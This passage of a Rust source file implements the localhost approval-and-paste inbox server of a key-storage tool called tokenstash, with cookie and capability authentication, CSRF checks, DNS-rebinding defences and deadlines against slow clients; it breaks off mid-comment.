//! Localhost inbox: the human surface. One click from the notification to the vendor's page,
//! paste, submit. Binds 127.0.0.1 only. Exits after 30 idle minutes with no open tasks.
//!
//! Loopback is not authentication — see `crate::inbox_auth` for the threat model. Every route
//! except `/verify` requires a credential: the browser session (full scope) or one card's
//! capability (that card only), presented as `?t=` on the first visit, then held as an
//! `HttpOnly; SameSite=Strict` cookie. POSTs additionally carry it in a hidden form field
//! (double submit), so a cross-site form post cannot ride the cookie into an answer.
//!
//! # One request at a time, so nobody may hold the line
//!
//! Requests are handled one after another on the main thread, which is what the database and
//! the stash want. That makes "a client that never finishes its request" the thing to design
//! against: any process on the machine, or a page in the browser, can open a POST, send the
//! headers and then nothing. If the handler waited for that body, every later request — a
//! human's paste, the CLI's `/verify` ownership probe — would wait behind it for as long as
//! the socket stayed open.
//!
//! So the main thread never reads from a socket. A fixed pool of [`READERS`] threads takes
//! connections off the listener and reads each request in full under a deadline that starts
//! the moment a reader takes the connection: [`REQUEST_DEADLINE`] for the whole request,
//! [`IO_TIMEOUT`] for any single wait for bytes, [`MAX_HEAD`] for the header block, and
//! [`MAX_BODY`] applied to the *declared* length before a byte of body is read. Whatever has
//! not arrived whole in time gets a `408` and the socket closed; a client that trickles a byte
//! per wait is cut off by the whole-request deadline all the same. Only a complete request
//! reaches [`handle`], so a truncated form can neither authenticate with the CSRF field at its
//! front nor hand a half-copied key to `answer_secret`. Writing is bounded the same way: a
//! whole response — status line, headers and body, error replies included — must be taken
//! within [`RESPONSE_DEADLINE`], and every partial write is given only the time that is left,
//! so the main thread spends at most that long on any one client however slowly it reads.
//! A request over the tailnet from another device also needs `tailscale whois` to say who sent
//! it, which can take seconds; the reader asks that too, before it hands the request over.
//!
//! What this bounds is resources and each individual read or write, not fairness. Time spent
//! in the kernel's listen backlog, in the acceptor's hand waiting for a free reader, or as a
//! complete request queued for the main thread is outside every deadline; a sustained flood of
//! clients can keep all the readers busy and starve a legitimate one, and this server does not
//! try to defeat that. What a flood cannot do is make anything here grow without bound, or
//! make any single wait unbounded.
//!
//! The server is a small HTTP/1.1 listener over `std::net`, not a framework: a framework that
//! owns the socket offers no way to put a deadline on it (and `tiny_http`, used before, drains
//! the declared body on whichever thread drops a request — the very stall being closed). One
//! request per connection, `Connection: close` on every response: a form page on loopback
//! needs nothing more, and keep-alive would be one more way to hold a reader.

use crate::inbox_auth;
use crate::util::App;
use anyhow::Result;
use clap::Args;
use secrecy::SecretString;
use std::collections::HashMap;
use std::io::{ErrorKind, Read, Write};
use std::net::{Shutdown, TcpListener, TcpStream};
use std::sync::mpsc::{self, RecvTimeoutError};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};
use tokenstash_core::db::{Task, TaskKind, TaskStatus};
use tokenstash_core::tasks::{self, Actor, AnswerResult};

#[derive(Args)]
pub struct InboxArgs {
    #[arg(long)]
    pub port: Option<u16>,
    /// Never auto-exit.
    #[arg(long)]
    pub keep: bool,
}

const IDLE_EXIT: Duration = Duration::from_secs(30 * 60);

/// Cap on a form post. Answers are pasted API keys, not uploads. Judged on the declared
/// `Content-Length` before any of the body is read.
const MAX_BODY: u64 = 64 * 1024;
/// Cap on the request line plus headers. A browser sends a couple of kilobytes; the session
/// cookie is 64 bytes.
const MAX_HEAD: usize = 16 * 1024;
/// Cap on the number of header lines.
const MAX_HEADERS: usize = 100;
/// A request — request line, headers and body — must have arrived in full this long after
/// a reader took its connection. On loopback a browser delivers a form post in one write.
const REQUEST_DEADLINE: Duration = Duration::from_secs(10);
/// A response — status line, headers and body — must have been taken in full this long after
/// the handler started writing it. The most the main thread spends on any one client.
const RESPONSE_DEADLINE: Duration = Duration::from_secs(10);
/// No single wait for bytes from a client, or for a client to take a response, lasts longer.
const IO_TIMEOUT: Duration = Duration::from_secs(5);
/// Reader threads, each reading one connection at a time. A browser opens at most six
/// connections to one origin, so a single hostile page leaves readers free.
const READERS: usize = 8;

pub fn serve(a: InboxArgs) -> Result<i32> {
    let app = App::open()?;
    let port = a.port.unwrap_or(app.cfg.inbox_port);
    let listener = match TcpListener::bind(("127.0.0.1", port)) {
        Ok(l) => l,
        Err(e) => {
            // Two `ensure_inbox` racing is normal and quiet; anything else is not.
            if e.kind() == ErrorKind::AddrInUse {
                eprintln!("inbox already running on {port}");
                return Ok(0);
            }
            eprintln!("tokenstash: cannot listen on 127.0.0.1:{port}: {e}");
            return Ok(tokenstash_core::exit::ERROR);
        }
    };
    let port = listener.local_addr().map(|l| l.port()).unwrap_or(port);
    // Only after the bind: the process that owns the port mints the browser session, and a
    // loser of the bind race above must not invalidate the winner's. Links handed out
    // before this start (a notification still in the tray) are dead from here on; the
    // next notification or `tokenstash open` carries the new session. The proof key and
    // the capability key persist, so the CLI still recognises this inbox and card links
    // already printed still open their card.
    let tokens = match inbox_auth::Tokens::start() {
        Ok(t) => t,
        Err(e) => {
            eprintln!("tokenstash: cannot mint the inbox session: {e:#}");
            return Ok(tokenstash_core::exit::ERROR);
        }
    };
    eprintln!("tokenstash inbox → http://127.0.0.1:{port}/");
    let (req_tx, requests) = mpsc::sync_channel::<Request>(READERS);
    spawn_readers(listener, false, req_tx.clone(), None);
    let mut tailnet_bound = None;
    let mut last_activity = Instant::now();
    loop {
        listen_tailnet(port, &mut tailnet_bound, &req_tx);
        match requests.recv_timeout(Duration::from_secs(1)) {
            Ok(req) => {
                last_activity = Instant::now();
                if let Err(e) = handle(&app, req, &tokens) {
                    eprintln!("inbox: {e:#}");
                }
            }
            Err(RecvTimeoutError::Timeout) => {
                if !a.keep && last_activity.elapsed() > IDLE_EXIT {
                    let _ = app.db.expire_overdue();
                    if app.db.list_tasks(None, true).map(|v| v.is_empty()).unwrap_or(true) {
                        return Ok(0);
                    }
                    last_activity = Instant::now();
                }
            }
            Err(RecvTimeoutError::Disconnected) => { eprintln!("inbox: the listener stopped"); return Ok(1); }
        }
    }
}

fn handle(app: &App, req: Request, tokens: &inbox_auth::Tokens) -> Result<()> {
    use inbox_auth::Scope;
    let url = req.url.clone();
    let (path, query) = match url.split_once('?') {
        Some((p, q)) => (p.to_string(), q.to_string()),
        None => (url.clone(), String::new()),
    };
    let q = parse_form(&query);
    let method = req.method.clone();

    // The one unauthenticated route, and deliberately ahead of every other check: it is how a
    // CLI that has not yet decided to trust this listener asks "are you the tokenstash inbox
    // for my TOKENSTASH_HOME?" without handing over a credential to find out. We answer a
    // fresh nonce with HMAC(proof key, nonce); a process squatting the port cannot, and
    // neither can anyone holding a session or card link captured from a URL — the proof key
    // never travels.
    // On loopback, and on the tailnet from this machine itself: the CLI proves the listener
    // there is ours before it hands out tailnet links. Another device is owed nothing.
    if path == "/verify" && (!req.tailnet || from_this_machine(&req)) {
        return match q.get("c") {
            Some(c) if !c.is_empty() && c.len() <= inbox_auth::MAX_CHALLENGE => {
                respond(req, 200, "text/plain", inbox_auth::verify_response(tokens.proof(), c))
            }
            _ => not_found(req),
        };
    }

    // A request over the tailnet is answered only while remote access is on, only for this
    // machine's tailnet name (the DNS-rebinding defence below, for that listener), and only
    // from this machine or from another device signed in as the owner. Tailscale names the
    // login behind every tailnet address, and nothing on this machine can send from another
    // device, so the owner's other devices are the person.
    let mut person_device = false;
    if req.tailnet {
        // The setting as it is now. One that cannot be read is not "on": falling back to what
        // the inbox read at start could keep answering after `remote off`.
        let Ok(cfg) = tokenstash_core::Config::load() else { return not_found(req) };
        if cfg.remote != tokenstash_core::config::Remote::Tailscale || !host_is_one_of(&req, &[cfg.remote_host.as_deref(), cfg.remote_ip.as_deref()]) {
            return not_found(req);
        }
        // The login came from the reader that read this request (see `peer_login`), so a
        // slow `tailscale whois` never holds this thread. No login is no answer.
        if !from_this_machine(&req) {
            match (req.peer_login.as_deref(), cfg.remote_login.as_deref()) {
                (Some(login), Some(owner)) if login == owner => person_device = true,
                _ => return not_found(req),
            }
        }
    } else if !host_is_loopback(&req) {
        // Defence in depth against DNS rebinding: a hostname that resolves to 127.0.0.1
        // carries the attacker's origin (so none of our cookies), but there is no reason to
        // serve it.
        return not_found(req);
    }

    // Two route families, two cookies, and neither reads the other's:
    //   `/` and `/t/<id>`  the full routes. The session cookie, or `?t=<session>` to set it.
    //   `/p/<id>`          one card's scoped route. That card's capability cookie (set for
    //                      this path only), or `?t=<id>.<mac>` to set it.
    // A full session on a scoped route is not consulted: the card link the agent printed
    // opens exactly what it was minted for, whoever clicks it, and the person's own login
    // is neither spent on it nor weakened by it. To act on a card with full authority the
    // person opens its full route from the index, the notification or `tokenstash open`.
    let route = match Route::of(&path) { Some(r) => r, None => return not_found(req) };
    let lookup = |id: &str| app.db.get_task(id).ok().flatten();
    // The person on another of their devices holds the full session on every route, as the
    // desktop notification would give it to them. A GET is enough to read (nothing a GET
    // does changes state) and sets the session cookie on the same response; a redirect would
    // not do, since a browser withholds SameSite=Strict cookies on a navigation that started
    // on another site (the chat the link was clicked in). A POST still needs that cookie and
    // the matching hidden field, so a page open in the same browser cannot post an answer.
    let mut req = req;
    let (presented, scope) = if person_device {
        req.set_cookie = Some(format!("{}={}; Path=/; HttpOnly; SameSite=Strict", inbox_auth::COOKIE, tokens.session()));
        if method == "GET" && q.contains_key("t") {
            // The agent's link carried a card credential the person does not need: drop it
            // from the address bar, and land on the card's full route.
            let dest = match &route { Route::Scoped(id) | Route::Full(id) => format!("/t/{id}"), Route::Index => "/".into() };
            return redirect(req, &dest);
        }
        let session = tokens.session().to_string();
        let held = method == "GET" || cookie(&req, inbox_auth::COOKIE).is_some_and(|c| inbox_auth::ct_eq(&c, &session));
        (Some(session), held.then_some(Scope::Full))
    } else {
        let presented = cookie(&req, route.cookie_name());
        // What the cookie proves, on this route: a session is Full; a capability is Task(id)
        // only when it names the card this path names, verified against that card's row
        // (fetched by exact id — never a prefix, so nothing resolves an id the caller half knows).
        let scope = presented.as_deref().and_then(|c| tokens.scope_of(c, lookup)).filter(|s| route.admits(s));
        (presented, scope)
    };
    let cookie_ok = scope.is_some();
    // A body declared over the cap was refused by the reader before a byte of it was read, so
    // there is no form to authenticate with and nothing that could have been stored in part.
    // A session holder is told why; anyone else gets the same bare 404 as everything else.
    // Refusing whole rather than truncating matters: the CSRF field sits at the front of the
    // body, so a cut-off form would still authenticate and parse_form would hand a
    // half-copied API key or note to answer_secret as though the human had typed it.
    if req.oversized {
        return if cookie_ok { respond(req, 413, "text/plain", "answer too large; nothing was stored".into()) } else { not_found(req) };
    }
    // Complete by construction: the reader delivers exactly the declared length or nothing.
    let form = if method == "POST" { parse_form(&String::from_utf8_lossy(&req.body)) } else { HashMap::new() };

    // GET: the cookie alone (SameSite=Strict stops a foreign page from making the browser
    // send it). POST: the cookie AND a matching hidden field — double submit, so even a
    // bypassed or unsupported SameSite cannot turn a cross-site form post into an answer.
    let authed = match method.as_str() {
        "POST" => cookie_ok && matches!((form.get("t"), presented.as_deref()), (Some(t), Some(c)) if inbox_auth::ct_eq(t, c)),
        _ => cookie_ok,
    };
    // A `?t=` on a GET: the human clicked a link from the chat (one card's capability, on
    // that card's scoped route), the notification or `tokenstash open` (the session, on a
    // full route). Swap it for the route's cookie and bounce to a clean path so the
    // credential stops appearing in the address bar, history, and Referer. A credential
    // that does not fit the route it was presented on — a capability for another card, a
    // session from before the inbox last restarted, a link minted by an older version — gets
    // the recovery page whatever cookies the browser holds: an explicit credential that
    // fails is refused, never papered over by a login in another tab. And a full session
    // already held is left exactly as it is: a card link never replaces it.
    if method == "GET" {
        if let Some(t) = q.get("t") {
            // The credential is dropped by its DECODED name — `t=`, `%74=`, repeated — so no
            // spelling parse_form reads as `t` survives into the Location header; the rest
            // of the query goes back exactly as it came, nothing re-encoded.
            let rest = strip_auth_params(&query);
            let dest = if rest.is_empty() { path.clone() } else { format!("{path}?{rest}") };
            // A network-path target (`//host`, `/\host`) was refused at parse time; this is
            // the one place a Location is built from the request, so it is checked again
            // here rather than trusted from there.
            if !same_origin_path(&dest) {
                return not_found(req);
            }
            return match tokens.scope_of(t, lookup).filter(|s| route.admits(s)) {
                Some(Scope::Full) if scope == Some(Scope::Full) => redirect(req, &dest),
                Some(Scope::Full) => redirect_authed(req, &dest, inbox_auth::COOKIE, "/", t),
                Some(Scope::Task(id)) => redirect_authed(req, &dest, inbox_auth::CAP_COOKIE, &format!("/p/{id}"), t),
                None => page_stale_link(req),
            };
        }
    }
    if !authed {
        return not_found(req);
    }
    let Some(scope) = scope else { return not_found(req) };
    // The CSRF hidden field carries the session's own credential: the capability on a
    // scoped page, the session on a full one. A scoped page never learns the session.
    let session_token = presented.as_deref().unwrap_or_default();

    app.db.expire_overdue()?;

    let (task, actor, home) = match (&route, &scope) {
        (Route::Index, Scope::Full) => {
            let list = app.db.list_tasks(None, true)?;
            let flash = q.get("m").cloned();
            return respond(req, 200, "text/html; charset=utf-8", page_index(&list, flash.as_deref()));
        }
        // A person may type a prefix on the full route; an ambiguous one is an error from
        // the lookup, and to the browser it is a 404, not a dropped connection.
        (Route::Full(id), Scope::Full) => match app.db.find_task(id) {
            Ok(Some(t)) => (t, Actor::Human, "/".to_string()),
            _ => return respond(req, 404, "text/plain", "no such task".into()),
        },
        // The scoped route serves one card, by the exact id the capability was verified
        // against; the cookie carries the card's page as its home, so a reload, a redirect
        // or a full login in another tab leaves it where it is.
        (Route::Scoped(id), Scope::Task(own)) if id == own => match app.db.get_task(own)? {
            Some(t) => (t, Actor::Requester, format!("/p/{own}")),
            None => return not_found(req),
        },
        // The person on another of their devices, on the agent's link: the card itself, with
        // their full authority, by the exact id in the path.
        (Route::Scoped(id), Scope::Full) if person_device => match app.db.get_task(id)? {
            Some(t) => (t, Actor::Human, "/".to_string()),
            None => return not_found(req),
        },
        _ => return not_found(req),
    };
    // A card the agent's link cannot complete: an approval, a paste other directories would
    // receive, or an action card. Its scoped page offers to send the person the full link.
    let needs_full = task.kind == TaskKind::Approval || tokenstash_core::actions::Action::of(&task).is_some() || (task.kind == TaskKind::Secret && tasks::fans_out(&app.ctx(), &task)?);
    if method == "GET" {
        return respond(req, 200, "text/html; charset=utf-8", page_task(&task, None, q.get("m").map(String::as_str), session_token, &scope, &app.cfg.env_file, needs_full));
    }
    if method == "POST" {
        let action = form.get("action").cloned().unwrap_or_default();
        let ctx = app.ctx();
        let msg: Result<String> = (|| {
            match (task.kind.clone(), action.as_str()) {
                // The person opened the agent's link, and deciding needs their own session:
                // send it to them the one way the agent cannot read, the desktop. Anyone with
                // the link can press this; all it does is notify the person again.
                (_, "notify") => send_full_link(app, &task),
                // An approval card's Deny is decided below, with Allow.
                (kind, "deny") if kind != TaskKind::Approval => {
                    tasks::deny(&ctx, &task, form.get("note").map(|s| s.as_str()))?;
                    Ok(format!("Denied {}", task.title))
                }
                (TaskKind::Secret, _) => {
                    let v = form.get("value").cloned().unwrap_or_default();
                    let v = v.trim().to_string();
                    if v.is_empty() { anyhow::bail!("empty value"); }
                    let skip = form.contains_key("skip_check");
                    // A paste other directories will receive (a Replace card; a key they
                    // hold a grant for) is a decision about them — the agent's link may not
                    // make it. `answer_secret_by` refuses that for a Requester under the
                    // index lock, before anything is stored.
                    match tasks::answer_secret_by(&ctx, actor, &task, SecretString::from(v), skip)? {
                        AnswerResult::Stored { injected_to, rotation, .. } => {
                            let mut m = format!("Stored {} and wrote it to {}", task.name.clone().unwrap_or_default(), injected_to.map(|p| p.display().to_string()).unwrap_or_else(|| "the stash".into()));
                            if let Some(r) = rotation {
                                if !r.rewritten.is_empty() { m.push_str(&format!("; also updated {} other project(s)", r.rewritten.len())); }
                                if !r.skipped.is_empty() { m.push_str(&format!("; {} project(s) STILL HOLD THE OLD VALUE ({}) — fix before revoking it", r.skipped.len(), r.skipped.iter().map(|(p, _)| tokenstash_core::project::short(std::path::Path::new(p))).collect::<Vec<_>>().join(", "))); }
                            }
                            Ok(m)
                        }
                        _ => Ok("stored".into()),
                    }
                }
                (TaskKind::Approval, _) => {
                    // Approving is the one thing a card session must not do: it is the
                    // human's yes to "this project may use my key", and the agent's link
                    // must not be able to give it. Refuse with no state change. Closing the card
                    // is the human's decision too: from the agent's link it would let the agent
                    // bury its own pairing card for a day, or another agent's in the same
                    // directory.
                    if scope != Scope::Full {
                        if action == "deny" {
                            anyhow::bail!("closing an approval card needs your own inbox link: use the one in the desktop notification (the button below sends it again) and decide on this card there");
                        }
                        anyhow::bail!("approving needs your own inbox link: use the one in the desktop notification (the button below sends it again) and approve this card there");
                    }
                    let decision = match action.as_str() { "allow" => tasks::Decision::Allow, "allow_broad" => tasks::Decision::AllowBroad, _ => tasks::Decision::Deny };
                    // What the page listed when it was rendered: a card that grew since
                    // (an agent asked for more) is refused and re-read. That holds for Deny
                    // too, which closes the card and every key on it: a key added after the
                    // page loaded is not declined unseen. The comparison and the close happen
                    // under the index write lock in `answer_approval`.
                    // The browser form always carries `seen`; a POST without it (a
                    // person scripting `curl`) is judged on the card as it is now.
                    let seen: Option<Vec<String>> = form.get("seen").map(|s| s.split(',').filter(|x| !x.is_empty()).map(String::from).collect());
                    match tasks::answer_approval(&ctx, &task, decision, seen.as_deref())? {
                        AnswerResult::Approved { injected, replaced } => Ok(format!("Approved; injected {}{}", if injected.is_empty() { "nothing new".into() } else { injected.join(", ") }, if replaced.is_empty() { String::new() } else { format!(". {} rejected by the provider at delivery — a Replace card is waiting", replaced.join(", ")) })),
                        _ => Ok(format!("Denied {}", task.title)),
                    }
                }
                (TaskKind::Human, _) => match tokenstash_core::actions::Action::of(&task) {
                    // An agent asked for this; confirming carries it out, so it takes the
                    // person's own session, like approving.
                    Some(act) => {
                        if scope != Scope::Full {
                            anyhow::bail!("confirming needs your own inbox link: use the one in the desktop notification (the button below sends it again) and confirm this card there");
                        }
                        crate::cmd::actions::confirm(app, &task, &act)
                    }
                    None => { tasks::answer_human(&ctx, &task, form.get("note").map(|s| s.as_str()).filter(|s| !s.is_empty()))?; Ok(format!("Done: {}", task.title)) }
                },
            }
        })();
        return match msg {
            Ok(m) => redirect(req, &format!("{home}?m={}", urlencoding::encode(&m))),
            Err(e) => respond(req, 200, "text/html; charset=utf-8", page_task(&task, Some(&format!("{e:#}")), None, session_token, &scope, &app.cfg.env_file, needs_full)),
        };
    }
    not_found(req)
}

/// How often one card may send its full link to the desktop. Pressing the button again is
/// the person not finding the first notification, not a reason to stack ten of them.
const RESEND_EVERY: Duration = Duration::from_secs(30);

/// Send the person a desktop notification carrying this card's full-session link: from it
/// they can approve, confirm or paste where the agent's link cannot. The session reaches only
/// the desktop, never the page that asked, so an agent pressing the button learns nothing.
fn send_full_link(app: &App, task: &Task) -> Result<String> {
    static SENT: Mutex<Option<HashMap<String, Instant>>> = Mutex::new(None);
    let mut sent = SENT.lock().unwrap_or_else(|p| p.into_inner());
    let sent = sent.get_or_insert_with(HashMap::new);
    if sent.get(&task.id).is_some_and(|at| at.elapsed() < RESEND_EVERY) {
        return Ok("Sent a moment ago: look for the tokenstash notification on this computer's desktop".into());
    }
    let link = desktop_link(&app.cfg, &task.id);
    if !crate::notify::desktop(&app.cfg, &task.title, &format!("{} · open this to decide", tokenstash_core::project::short(std::path::Path::new(&task.project))), &link) {
        anyhow::bail!("{}", if app.cfg.notifications { "this computer could not show a desktop notification (no desktop session here, as on a server or over SSH)" } else { "desktop notifications are turned off (notifications = false in config.toml)" });
    }
    sent.insert(task.id.clone(), Instant::now());
    Ok("Sent: click the tokenstash notification on this computer's desktop to decide on this card".into())
}

/// The full-session link to card `id` that the inbox puts in a desktop notification, always on
/// loopback. The notification shows on this computer, where 127.0.0.1 opens. A Tailscale link
/// would first have this thread prove the inbox's own tailnet listener, a request that only
/// this thread can answer, so it would wait out the probe's timeout and fall back anyway.
fn desktop_link(cfg: &tokenstash_core::Config, id: &str) -> String {
    let here = tokenstash_core::Config { remote: tokenstash_core::config::Remote::Off, ..cfg.clone() };
    crate::util::inbox_url_human(&here, Some(id), crate::notify::Inbox::Ours)
}

/// Which family a path belongs to. Anything else is nothing.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Route {
    Index,
    /// `/t/<id or prefix>`: full session only.
    Full(String),
    /// `/p/<id>`: that card's capability only.
    Scoped(String),
}

impl Route {
    fn of(path: &str) -> Option<Route> {
        if path == "/" {
            return Some(Route::Index);
        }
        if let Some(id) = path_task_id(path, "/t/") {
            return Some(Route::Full(id.to_string()));
        }
        path_task_id(path, "/p/").map(|id| Route::Scoped(id.to_string()))
    }

    /// The cookie this route reads. The other one is not looked at.
    fn cookie_name(&self) -> &'static str {
        match self {
            Route::Scoped(_) => inbox_auth::CAP_COOKIE,
            _ => inbox_auth::COOKIE,
        }
    }

    /// Does a verified credential fit this route? The session fits the full routes; a card
    /// capability fits its own card's scoped route and nothing else.
    fn admits(&self, scope: &inbox_auth::Scope) -> bool {
        match (self, scope) {
            (Route::Index | Route::Full(_), inbox_auth::Scope::Full) => true,
            (Route::Scoped(id), inbox_auth::Scope::Task(own)) => id == own,
            _ => false,
        }
    }
}

/// The id a `<prefix><id>` path names, trailing slash tolerated. What it means — a prefix a
/// person typed, or the one exact card a link opens — is the route's business.
fn path_task_id<'a>(path: &'a str, prefix: &str) -> Option<&'a str> {
    let id = path.strip_prefix(prefix)?.trim_end_matches('/');
    (!id.is_empty() && !id.contains('/')).then_some(id)
}

/// Anything the caller is not authorised for looks like nothing at all: bare 404, empty body.
/// A local process or a foreign page probing the port learns neither that an inbox is here nor
/// that a given task id exists.
fn not_found(req: Request) -> Result<()> {
    req.respond(Reply::new(404, String::new()).with("Cache-Control", "no-store"))
}

fn header<'a>(req: &'a Request, name: &str) -> Option<&'a str> {
    req.headers.iter().find(|(n, _)| n.eq_ignore_ascii_case(name)).map(|(_, v)| v.as_str())
}

fn cookie(req: &Request, name: &'static str) -> Option<String> {
    header(req, "Cookie")?.split(';').find_map(|kv| {
        let (k, v) = kv.split_once('=')?;
        (k.trim() == name).then(|| v.trim().to_string())
    })
}

/// A tailnet request that comes from this machine: from its own Tailscale address, or from
/// 127.0.0.1 or ::1 (a local connection to that address leaves from one or the other). No
/// other device's traffic arrives with any of these sources.
fn from_this_machine(req: &Request) -> bool {
    let Some(peer) = req.peer.map(|p| p.ip()) else { return false };
    let loopback: [std::net::IpAddr; 2] = [std::net::Ipv4Addr::LOCALHOST.into(), std::net::Ipv6Addr::LOCALHOST.into()];
    loopback.contains(&peer) || tokenstash_core::Config::load().ok().and_then(|c| c.remote_ip).and_then(|i| i.parse().ok()) == Some(peer)
}

/// The Host header names one of `hosts` (any port).
fn host_is_one_of(req: &Request, hosts: &[Option<&str>]) -> bool {
    let Some(v) = header(req, "Host") else { return false };
    let host = v.rsplit_once(':').map(|(h, port)| if port.bytes().all(|b| b.is_ascii_digit()) { h } else { v }).unwrap_or(v);
    hosts.iter().flatten().any(|h| h.eq_ignore_ascii_case(host))
}

fn host_is_loopback(req: &Request) -> bool {
    let Some(v) = header(req, "Host") else { return false };
    let host = match v.strip_prefix('[') {
        Some(rest) => rest.split(']').next().unwrap_or_default(), // [::1]:7433
        None => v.split(':').next().unwrap_or_default(),          // 127.0.0.1:7433
    };
    matches!(host, "127.0.0.1" | "localhost" | "::1")
}

fn respond(req: Request, code: u16, ctype: &str, body: String) -> Result<()> {
    req.respond(Reply::new(code, body)
        .with("Content-Type", ctype)
        .with("Cache-Control", "no-store")
        .with("X-Frame-Options", "DENY")
        // The pages are self-contained: one inline <style>, no script, no image, no fetch.
        // Saying so stops a link or a field that got past the escaping upstream from
        // running anything in this origin — the origin whose session approves grants.
        .with("Content-Security-Policy", "default-src 'none'; style-src 'unsafe-inline'; form-action 'self'; base-uri 'none'; frame-ancestors 'none'")
        .with("Referrer-Policy", "no-referrer"))
}

/// A `?t=` that authenticates nothing on the inbox that is running now: a notification from
/// before the last restart, a link an older version minted, a capability re-addressed to a
/// card it was not minted for. The page says how to get a live link and nothing about
/// which card, if any, the link named. Still a 404: to a script it is as closed as the
/// bare one, and `/verify` already tells any local process that an inbox is here.
fn page_stale_link(req: Request) -> Result<()> {
    let body = "<div class=err>This link is no longer valid.</div><p>Inbox links stop working when the inbox restarts, and a card's link opens that card only. To continue, click the newest tokenstash desktop notification, or open the card from the link your agent gave you and press <em>Send the link to my desktop</em>.</p><p class=mut>If you did not expect this page, close it: a link that has expired cannot be used to answer anything.</p>";
    respond(req, 404, "text/html; charset=utf-8", layout("Link expired", body.into()))
}

/// 303 that also installs a cookie: the session at `Path=/`, or one card's capability at
/// `Path=/p/<id>` so the browser presents it to that card's route alone. No `Secure`
/// attribute: this is plain HTTP on the loopback interface and `Secure` would make the
/// browser drop the cookie outright. No `Max-Age` either — it dies with the browser session.
fn redirect_authed(req: Request, to: &str, name: &str, cookie_path: &str, token: &str) -> Result<()> {
    let set_cookie = format!("{name}={token}; Path={cookie_path}; HttpOnly; SameSite=Strict");
    req.respond(Reply::new(303, String::new()).with("Location", local(to)).with("Set-Cookie", set_cookie).with("Cache-Control", "no-store"))
}

fn redirect(req: Request, to: &str) -> Result<()> {
    req.respond(Reply::new(303, String::new()).with("Location", local(to)))
}

/// `to` if it is a path on this origin, else `/`: the last check before a Location header is
/// written, whoever built the target.
fn local(to: &str) -> &str {
    if same_origin_path(to) { to } else { "/" }
}

/// An absolute path on this origin: not a network-path reference (`//host`, or `/\host`, which
/// browsers read the same way) and no backslash anywhere for a browser to turn into a slash.
fn same_origin_path(p: &str) -> bool {
    p.starts_with('/') && !p.starts_with("//") && !p.contains('\\')
}

/// The query without any parameter whose decoded name is `t` — the session credential in any
/// spelling parse_form would accept, every occurrence — the remaining pairs verbatim.
fn strip_auth_params(query: &str) -> String {
    query.split('&')
        .filter(|kv| !kv.is_empty() && form_decode(kv.split('=').next().unwrap_or_default()) != "t")
        .collect::<Vec<_>>()
        .join("&")
}

// ---- the server ----------------------------------------------------------------------------

/// A complete request, as a reader thread delivers it to the main thread. Answered exactly
/// once with [`Request::respond`]; dropped unanswered (a handler error) it sends a bare 500 so
/// the browser is not left waiting.
struct Request {
    method: String,
    /// Path and query exactly as sent, e.g. `/t/abc?m=x`.
    url: String,
    headers: Vec<(String, String)>,
    /// The whole body: exactly `Content-Length` bytes, or empty.
    body: Vec<u8>,
    /// The declared `Content-Length` was over [`MAX_BODY`]; none of the body was read.
    oversized: bool,
    stream: Option<TcpStream>,
    /// Who connected.
    peer: Option<std::net::SocketAddr>,
    /// It came in on the Tailscale listener, not loopback.
    tailnet: bool,
    /// For a tailnet request from another device, the login Tailscale names for its address
    /// (see [`peer_login`]). `None` otherwise.
    peer_login: Option<String>,
    /// A cookie every response to this request carries: the session, for the person on
    /// another of their devices (see `handle`).
    set_cookie: Option<String>,
}

/// A response: status, our headers, body. `Content-Length` and `Connection: close` are added
/// when it is written.
struct Reply {
    code: u16,
    headers: Vec<(&'static str, String)>,
    body: String,
}

impl Reply {
    fn new(code: u16, body: String) -> Self {
        Reply { code, headers: Vec::new(), body }
    }
    fn with(mut self, name: &'static str, value: impl Into<String>) -> Self {
        self.headers.push((name, value.into()));
        self
    }
}

impl Request {
    fn respond(mut self, mut reply: Reply) -> Result<()> {
        if let Some(c) = self.set_cookie.take() {
            reply = reply.with("Set-Cookie", c);
        }
        let mut stream = self.stream.take().expect("a request is answered once");
        let head_only = self.method == "HEAD";
        let written = write_reply(&mut stream, &reply, head_only, Instant::now() + RESPONSE_DEADLINE);
        let _ = stream.shutdown(Shutdown::Both);
        match written {
            // The client went away first: nothing to do and nothing worth logging.
            Err(e) if matches!(e.kind(), ErrorKind::BrokenPipe | ErrorKind::ConnectionAborted | ErrorKind::ConnectionReset) => Ok(()),
            Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => anyhow::bail!("a client did not take its response within {RESPONSE_DEADLINE:?}; dropped it"),
            other => Ok(other?),
        }
    }
}

impl Drop for Request {
    fn drop(&mut self) {
        if let Some(mut stream) = self.stream.take() {
            let _ = write_reply(&mut stream, &Reply::new(500, String::new()), false, Instant::now() + IO_TIMEOUT);
            let _ = stream.shutdown(Shutdown::Both);
        }
    }
}

/// Writes `reply` whole — status line, headers and body — before `deadline`, or fails.
fn write_reply(stream: &mut TcpStream, reply: &Reply, head_only: bool, deadline: Instant) -> std::io::Result<()> {
    let mut out = format!("HTTP/1.1 {} {}\r\n", reply.code, reason(reply.code));
    for (name, value) in &reply.headers {
        out.push_str(&format!("{name}: {value}\r\n"));
    }
    out.push_str(&format!("Content-Length: {}\r\nConnection: close\r\n\r\n", reply.body.len()));
    let mut out = out.into_bytes();
    if !head_only {
        out.extend_from_slice(reply.body.as_bytes());
    }
    write_bounded(stream, &out, deadline)
}

/// `write_all` with one deadline for the whole of it. Each partial write is given only the
/// time that is left, so a client that takes a page a few bytes at a time cannot restart the
/// clock with every write and hold the writing thread for as long as it cares to keep reading.
/// (`TcpStream` buffers nothing, so there is nothing to flush.)
fn write_bounded(stream: &mut TcpStream, mut bytes: &[u8], deadline: Instant) -> std::io::Result<()> {
    while !bytes.is_empty() {
        let left = deadline.saturating_duration_since(Instant::now());
        if left.is_zero() {
            return Err(std::io::Error::new(ErrorKind::TimedOut, "the deadline for writing passed"));
        }
        stream.set_write_timeout(Some(left))?;
        match stream.write(bytes) {
            Ok(0) => return Err(std::io::Error::new(ErrorKind::WriteZero, "the client stopped taking the response")),
            Ok(n) => bytes = &bytes[n..],
            Err(e) if e.kind() == ErrorKind::Interrupted => {}
            Err(e) => return Err(e),
        }
    }
    Ok(())
}

fn reason(code: u16) -> &'static str {
    match code {
        200 => "OK", 303 => "See Other", 400 => "Bad Request", 404 => "Not Found", 408 => "Request Timeout",
        411 => "Length Required", 413 => "Content Too Large", 417 => "Expectation Failed",
        431 => "Request Header Fields Too Large", 500 => "Internal Server Error", _ => "",
    }
}

/// Accept connections and read complete requests off them on threads of their own, so the
